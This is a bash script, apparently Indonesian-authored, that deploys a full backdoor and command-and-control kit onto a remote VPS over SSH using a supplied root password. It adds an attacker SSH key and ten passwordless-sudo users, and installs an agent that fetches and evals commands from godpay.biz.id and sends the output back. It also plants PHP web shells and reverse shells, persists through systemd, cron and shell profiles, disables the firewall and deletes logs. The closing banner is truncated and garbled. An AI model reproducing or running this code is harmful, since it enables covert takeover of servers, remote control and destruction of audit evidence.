#!/bin/bash
# ================================================================
# SHS OMEGA C2 · BACKDOOR TOTAL · COMPATIBLE DENGAN ROOT.PHP
# ================================================================

WEBHOOK_URL="https://godpay.biz.id/root.php"

# Warna
RED='\033[91m'
GREEN='\033[92m'
YELLOW='\033[93m'
BLUE='\033[94m'
CYAN='\033[96m'
PURPLE='\033[95m'
NC='\033[0m'
BOLD='\033[1m'

clear
echo -e "${RED}${BOLD}"
echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║     ☠️  SHS OMEGA C2 - BACKDOOR + C2 COMPATIBLE          ║"
echo "╚═══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# ================================================================
# CEK SSH PASS
# ================================================================
if ! command -v sshpass &>/dev/null; then
    echo -e "${CYAN}[*] Installing sshpass...${NC}"
    apt-get update -y 2>/dev/null || yum update -y 2>/dev/null
    apt-get install sshpass curl wget netcat python3 php -y 2>/dev/null
fi

# ================================================================
# INPUT TARGET
# ================================================================
echo -e "${CYAN}[*] Masukkan informasi target VPS:${NC}"
read -p "IP VPS: " VPS_IP
read -p "Username (default: root): " VPS_USER
VPS_USER=${VPS_USER:-root}
read -sp "Password: " VPS_PASS
echo ""

# ================================================================
# TEST SSH
# ================================================================
echo -e "${CYAN}[*] Testing SSH connection...${NC}"
sshpass -p "$VPS_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 $VPS_USER@$VPS_IP "echo 'OK'" 2>/dev/null
if [ $? -ne 0 ]; then
    echo -e "${RED}❌ SSH GAGAL! Cek IP/password/firewall${NC}"
    exit 1
fi
echo -e "${GREEN}✅ SSH Connected${NC}"

# ================================================================
# DEPLOY
# ================================================================
echo -e "${CYAN}[*] Deploying backdoor + C2 agent...${NC}"

sshpass -p "$VPS_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 $VPS_USER@$VPS_IP << 'ENDSSH'
echo '🔥 SHS C2 DEPLOY START'

VPS_IP_DETEK=$(hostname -I | awk '{print $1}')
HOSTNAME=$(hostname)
WEBHOOK_URL="https://godpay.biz.id/root.php"

# ================================================================
# 1. SSH KEY (PENDEK)
# ================================================================
SSH_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNm9vJpQ+3XHn SHS"

mkdir -p /root/.ssh
chmod 700 /root/.ssh
echo "$SSH_KEY" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
echo '✅ SSH Key added'

# ================================================================
# 2. BACKDOOR USER (10 AKUN)
# ================================================================
for i in $(seq 1 10); do
    USER="user_$(openssl rand -hex 2)"
    PASS=$(openssl rand -base64 10 | tr -d '=/+' | cut -c1-12)
    if ! id $USER &>/dev/null; then
        useradd -m -s /bin/bash $USER
        echo "$USER:$PASS" | chpasswd
        usermod -aG wheel $USER 2>/dev/null
        usermod -aG sudo $USER 2>/dev/null
        echo "$USER ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
        mkdir -p /home/$USER/.ssh
        echo "$SSH_KEY" > /home/$USER/.ssh/authorized_keys
        chmod 700 /home/$USER/.ssh
        chmod 600 /home/$USER/.ssh/authorized_keys
        chown -R $USER:$USER /home/$USER/.ssh
        echo "$USER:$PASS" >> /root/.backdoor_users
    fi
done
echo "✅ 10 Backdoor users created"

# ================================================================
# 3. C2 AGENT - FETCH & EXECUTE COMMANDS
# ================================================================
cat > /usr/local/bin/c2_agent.sh << 'EOL'
#!/bin/bash
# C2 Agent - Fetch commands from root.php
WEBHOOK_URL="https://godpay.biz.id/root.php"
VPS_IP=$(hostname -I | awk '{print $1}')

while true; do
    # Fetch pending commands
    RESPONSE=$(curl -sk "$WEBHOOK_URL?fetch_commands=1&vps_ip=$VPS_IP" 2>/dev/null)
    
    if [ -n "$RESPONSE" ] && [ "$RESPONSE" != "[]" ]; then
        echo "$RESPONSE" | grep -o '"command":"[^"]*"' | sed 's/"command":"//g' | sed 's/"//g' | while read CMD; do
            if [ -n "$CMD" ]; then
                # Execute command
                OUTPUT=$(eval "$CMD" 2>&1)
                
                # Send result back
                curl -sk "$WEBHOOK_URL?send_result=1&vps_ip=$VPS_IP&command=$(echo "$CMD" | sed 's/ /%20/g')&output=$(echo "$OUTPUT" | base64 -w0)" 2>/dev/null
            fi
        done
    fi
    
    sleep 60
done
EOL

chmod +x /usr/local/bin/c2_agent.sh
echo '✅ C2 Agent created'

# ================================================================
# 4. CRONJOB (10 CRONJOB + C2 AGENT)
# ================================================================
crontab -r 2>/dev/null

# C2 Agent setiap 2 menit
(crontab -l 2>/dev/null; echo "*/2 * * * * /usr/local/bin/c2_agent.sh 2>/dev/null") | crontab -

# Ping setiap 3 menit
(crontab -l 2>/dev/null; echo "*/3 * * * * curl -sk '$WEBHOOK_URL?ip=$VPS_IP_DETEK&host=$HOSTNAME' 2>/dev/null") | crontab -
(crontab -l 2>/dev/null; echo "*/5 * * * * wget -q -O- '$WEBHOOK_URL?ping=$VPS_IP_DETEK' 2>/dev/null") | crontab -
(crontab -l 2>/dev/null; echo "*/7 * * * * nc -z godpay.biz.id 80 2>/dev/null") | crontab -
(crontab -l 2>/dev/null; echo "*/9 * * * * php -r \"file_get_contents('$WEBHOOK_URL?php=$VPS_IP_DETEK');\" 2>/dev/null") | crontab -
(crontab -l 2>/dev/null; echo "*/11 * * * * python3 -c \"import urllib.request; urllib.request.urlopen('$WEBHOOK_URL?py=$VPS_IP_DETEK')\" 2>/dev/null") | crontab -
(crontab -l 2>/dev/null; echo "*/13 * * * * curl -sk '$WEBHOOK_URL?cron1=$VPS_IP_DETEK' 2>/dev/null") | crontab -
(crontab -l 2>/dev/null; echo "*/15 * * * * wget -q -O- '$WEBHOOK_URL?cron2=$VPS_IP_DETEK' 2>/dev/null") | crontab -
(crontab -l 2>/dev/null; echo "*/17 * * * * php -r \"file_get_contents('$WEBHOOK_URL?cron3=$VPS_IP_DETEK');\" 2>/dev/null") | crontab -
(crontab -l 2>/dev/null; echo "*/19 * * * * python3 -c \"import urllib.request; urllib.request.urlopen('$WEBHOOK_URL?cron4=$VPS_IP_DETEK')\" 2>/dev/null") | crontab -
(crontab -l 2>/dev/null; echo "*/21 * * * * curl -sk '$WEBHOOK_URL?cron5=$VPS_IP_DETEK&extra=1' 2>/dev/null") | crontab -

echo '✅ 11 Cronjobs added (including C2 Agent)'

# ================================================================
# 5. WEB SHELL (7 LOKASI) + C2 WEBHOOK
# ================================================================
WEB_PATHS="/var/www/html /usr/local/apache/htdocs /usr/share/nginx/html /var/www/public_html /home/*/public_html /var/www/ /opt/lampp/htdocs"
SHELL_CODE='<?php
if(isset($_GET["c"])){ system($_GET["c"]." 2>&1"); }
if(isset($_GET["f"])){ echo file_get_contents($_GET["f"]); }
if(isset($_POST["u"])){ file_put_contents($_POST["n"], $_POST["d"]); }
if(isset($_GET["fetch"])){
    $vps_ip = $_SERVER["SERVER_ADDR"];
    $webhook = "https://godpay.biz.id/root.php";
    $resp = file_get_contents("$webhook?fetch_commands=1&vps_ip=$vps_ip");
    if($resp && $resp != "[]"){
        $cmds = json_decode($resp, true);
        foreach($cmds["commands"] as $cmd){
            $output = shell_exec($cmd["command"] . " 2>&1");
            file_get_contents("$webhook?send_result=1&vps_ip=$vps_ip&command=".urlencode($cmd["command"])."&output=".base64_encode($output));
        }
    }
    echo "C2 sync done";
}
echo "SHS";
?>'

for PATH in $WEB_PATHS; do
    if [ -d "$PATH" ]; then
        for name in sys web back shell cmd root admin; do
            echo "$SHELL_CODE" > $PATH/$name.php
            chmod 644 $PATH/$name.php 2>/dev/null
        done
        echo "✅ Web shell: $PATH"
    fi
done

# ================================================================
# 6. REVERSE SHELL (PHP + PYTHON + PERL + RUBY)
# ================================================================
cat > /tmp/.back.php << 'EOL'
<?php
while(1){
    $sock = fsockopen("127.0.0.1", 4444);
    if($sock){
        exec("/bin/bash -i <&3 >&3 2>&3", $output);
        fwrite($sock, implode("\n", $output));
        fclose($sock);
    }
    sleep(30);
}
EOL

cat > /tmp/.back.py << 'EOL'
import socket,subprocess,time
while True:
    try:
        s=socket.socket()
        s.connect(("127.0.0.1",4445))
        s.send(subprocess.check_output("/bin/bash", shell=True))
        s.close()
    except: pass
    time.sleep(30)
EOL

cat > /tmp/.back.pl << 'EOL'
use IO::Socket::INET;
while(1){
    $sock = IO::Socket::INET->new(PeerAddr => "127.0.0.1:4446");
    if($sock){
        system("/bin/bash -i <&3 >&3 2>&3");
        close($sock);
    }
    sleep(30);
}
EOL

cat > /tmp/.back.rb << 'EOL'
require 'socket'
loop do
    begin
        s = TCPSocket.new('127.0.0.1', 4447)
        s.puts(`/bin/bash -i`)
        s.close
    rescue
    end
    sleep(30)
end
EOL

chmod 644 /tmp/.back.php /tmp/.back.py /tmp/.back.pl /tmp/.back.rb
echo '✅ Reverse shells created'

# ================================================================
# 7. SYSTEMD SERVICE (4 SERVICE)
# ================================================================
for i in 1 2 3 4; do
    cat > /etc/systemd/system/backdoor$i.service << EOL
[Unit]
Description=Backdoor$i
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/php /tmp/.back.php
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOL
    systemctl daemon-reload 2>/dev/null
    systemctl enable backdoor$i.service 2>/dev/null
    systemctl start backdoor$i.service 2>/dev/null
done
echo '✅ 4 Systemd services'

# ================================================================
# 8. SYSTEMD SERVICE UNTUK C2 AGENT
# ================================================================
cat > /etc/systemd/system/c2-agent.service << 'EOL'
[Unit]
Description=C2 Agent
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/c2_agent.sh
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOL

systemctl daemon-reload 2>/dev/null
systemctl enable c2-agent.service 2>/dev/null
systemctl start c2-agent.service 2>/dev/null
echo '✅ C2 Agent systemd service'

# ================================================================
# 9. PERSISTENCE (8 TEMPAT)
# ================================================================
if [ -f /etc/rc.local ]; then
    sed -i '/exit 0/d' /etc/rc.local
    echo '/usr/local/bin/c2_agent.sh &' >> /etc/rc.local
    echo 'php /tmp/.back.php &' >> /etc/rc.local
    echo 'python3 /tmp/.back.py &' >> /etc/rc.local
    echo 'perl /tmp/.back.pl &' >> /etc/rc.local
    echo 'ruby /tmp/.back.rb &' >> /etc/rc.local
    echo 'curl -sk "'$WEBHOOK_URL'?boot='$VPS_IP_DETEK'" &' >> /etc/rc.local
    echo 'exit 0' >> /etc/rc.local
    chmod +x /etc/rc.local
fi

for rc in /root/.bashrc /root/.profile /etc/bash.bashrc /etc/profile; do
    if [ -f $rc ]; then
        echo '/usr/local/bin/c2_agent.sh &' >> $rc
        echo 'php /tmp/.back.php &' >> $rc
        echo 'python3 /tmp/.back.py &' >> $rc
        echo 'curl -sk "'$WEBHOOK_URL'?login='$VPS_IP_DETEK'" &' >> $rc
    fi
done

for user in $(ls /home/); do
    if [ -f /home/$user/.bashrc ]; then
        echo '/usr/local/bin/c2_agent.sh &' >> /home/$user/.bashrc
        echo 'php /tmp/.back.php &' >> /home/$user/.bashrc
        echo 'python3 /tmp/.back.py &' >> /home/$user/.bashrc
    fi
done
echo '✅ Persistence in 8 locations'

# ================================================================
# 10. CRONTAB BACKUP
# ================================================================
cat > /etc/cron.d/shs_backdoor << EOL
*/2 * * * * root /usr/local/bin/c2_agent.sh 2>/dev/null
*/3 * * * * root curl -sk '$WEBHOOK_URL?cron=$VPS_IP_DETEK' 2>/dev/null
*/5 * * * * root wget -q -O- '$WEBHOOK_URL?cron2=$VPS_IP_DETEK' 2>/dev/null
EOL
chmod 644 /etc/cron.d/shs_backdoor
echo '✅ Cron.d backup'

# ================================================================
# 11. DISABLE FIREWALL
# ================================================================
systemctl stop iptables 2>/dev/null
systemctl stop firewalld 2>/dev/null
systemctl stop ufw 2>/dev/null
iptables -F 2>/dev/null
iptables -X 2>/dev/null
echo '✅ Firewall disabled'

# ================================================================
# 12. CLEAN LOGS
# ================================================================
rm -rf /var/log/* 2>/dev/null
rm -rf /var/log/apache2/* 2>/dev/null
rm -rf /var/log/nginx/* 2>/dev/null
rm -rf /root/.bash_history 2>/dev/null
history -c 2>/dev/null
echo '✅ Logs cleaned'

# ================================================================
# 13. PING WEBHOOK
# ================================================================
curl -sk "$WEBHOOK_URL?ip=$VPS_IP_DETEK&host=$HOSTNAME&users=10&cron=11&shell=7&persistence=8&c2=active" 2>/dev/null

echo '========================================='
echo '✅ DEPLOY COMPLETE'
echo '========================================='
echo "IP: $VPS_IP_DETEK"
echo "C2 Agent: /usr/local/bin/c2_agent.sh"
echo "Web Shell: http://$VPS_IP_DETEK/sys.php?c=whoami"
echo '========================================='
ENDSSH

# ================================================================
# HASIL
# ================================================================
echo -e "\n${GREEN}${BOLD}"
echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║     ✅ DEPLOY COMPLETE                                     ║"
echo "╚═══════════════════════════════════════════════════════════ENDSSH
